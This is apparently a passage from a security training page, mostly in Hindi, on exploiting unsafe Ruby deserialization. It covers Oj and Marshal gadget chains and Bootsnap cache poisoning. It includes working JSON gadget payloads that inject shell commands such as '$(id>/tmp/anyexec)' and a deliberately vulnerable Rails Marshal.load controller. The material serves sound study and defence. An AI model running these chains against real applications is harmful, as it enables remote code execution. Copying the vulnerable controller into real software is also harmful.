<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Library</strong></td><td><strong>Input data</strong></td><td><strong>Kick-off method inside class</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (class needs to be put into hash(map) as key)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (class needs to be put into hash(map) as key)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

बुनियादी उदाहरण:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Oj का दुरुपयोग करने की कोशिश में, यह संभव था कि एक gadget class मिल सके जो अपने `hash` function के अंदर `to_s` को कॉल करे, जो `spec` को कॉल करे, जो `fetch_path` को कॉल करे — और इसे किसी random URL को fetch कराने के लिए बनाया जा सकता था, जो इन प्रकार की unsanitized deserialization vulnerabilities का एक शानदार detector देता है।
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
इसके अलावा, यह पाया गया कि पिछली तकनीक के साथ सिस्टम में एक फ़ोल्डर भी बनाया जाता है, जो किसी अन्य gadget का दुरुपयोग करके इसे किसी ऐसी चीज़ के साथ पूर्ण RCE में बदलने के लिए आवश्यक है, जैसे:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

नीचे उस लेख में बताए गए चरणों का संक्षेप है, जो arbitrary file write vulnerability का दुरुपयोग करके Bootsnap caching का exploit करने के लिए हैं:

- Identify the Vulnerability and Environment

Rails app की file upload functionality attacker को arbitrary तरीके से files लिखने की अनुमति देती है। हालाँकि app restrictions के साथ चलता है (केवल कुछ directories जैसे tmp writable हैं क्योंकि Docker का non-root user उपयोग हो रहा है), फिर भी इससे Bootsnap cache directory में लिखना संभव होता है (आम तौर पर tmp/cache/bootsnap के अंतर्गत)।

- Understand Bootsnap’s Cache Mechanism

Bootsnap Rails के boot समय को तेज करने के लिए compiled Ruby code, YAML, और JSON फाइलों को cache करता है। यह cache फाइलें store करता है जिनमें एक cache key header शामिल होता है (जिसमें Ruby version, file size, mtime, compile options आदि जैसे फ़ील्ड होते हैं) और उसके बाद compiled code आता है। इस header का उपयोग app startup के दौरान cache को validate करने के लिए किया जाता है।

- Gather File Metadata

हमलावर पहले एक target file चुनता है जो संभवतः Rails startup के दौरान लोड होगी (उदाहरण के लिए, Ruby की standard library की set.rb)। container के अंदर Ruby code execute करके वे महत्वपूर्ण metadata निकालते हैं (जैसे RUBY_VERSION, RUBY_REVISION, size, mtime, और compile_option)। यह डेटा एक वैध cache key बनाने के लिए आवश्यक है।

- Compute the Cache File Path

Bootsnap के FNV-1a 64-bit hash mechanism को replicate करके सही cache file path निर्धारित किया जाता है। यह कदम सुनिश्चित करता है कि malicious cache file उस जगह पर ठीक से रखा जाए जहाँ Bootsnap उसे expect करता है (उदा., tmp/cache/bootsnap/compile-cache-iseq/ के अंतर्गत)।

- Craft the Malicious Cache File

हमलावर एक payload तैयार करता है जो:

- Executes arbitrary commands (for example, running id to show process info).
- Removes the malicious cache after execution to prevent recursive exploitation.
- Loads the original file (e.g., set.rb) to avoid crashing the application.

यह payload binary Ruby code में compile किया जाता है और पहले इकट्ठा किए गए metadata और Bootsnap के सही version नंबर का उपयोग करके सावधानीपूर्वक बनाए गए cache key header के साथ concatenated किया जाता है।

- Overwrite and Trigger Execution

arbitrary file write vulnerability का उपयोग करके, हमलावर crafted cache file को निर्धारित location पर लिखता है। फिर वे server restart trigger करते हैं (tmp/restart.txt में लिखकर, जिसे Puma monitor करता है)। Restart के दौरान, जब Rails उस target file को require करता है, malicious cache file लोड हो जाती है, जिससे remote code execution (RCE) होता है।



### Ruby Marshal exploitation in practice (updated)

किसी भी path को जहाँ untrusted bytes `Marshal.load`/`marshal_load` तक पहुँचते हैं, RCE sink के रूप में मानें। Marshal arbitrary object graphs reconstruct करता है और materialization के दौरान library/gem callbacks trigger करता है।

- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- असली chains में देखी जाने वाली सामान्य gadget classes: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- payloads में embedded सामान्य side-effect marker (unmarshal के दौरान executed):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
यह वास्तविक ऐप्स में कहाँ प्रकट होता है:
- Rails cache stores और session stores जिनमें ऐतिहासिक रूप से Marshal का उपयोग होता रहा है
- Background job backends और file-backed object stores
- किसी भी custom persistence या binary object blobs के transport

औद्योगीकृत gadget खोज:
- constructors, `hash`, `_load`, `init_with`, या unmarshal के दौरान invoke होने वाले side-effectful methods के लिए Grep करें
- CodeQL के Ruby unsafe deserialization queries का उपयोग करके sources → sinks को trace करें और gadgets को surface करें
- सार्वजनिक multi-format PoCs (JSON/XML/YAML/Marshal) के साथ validate करें


## संदर्भ

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
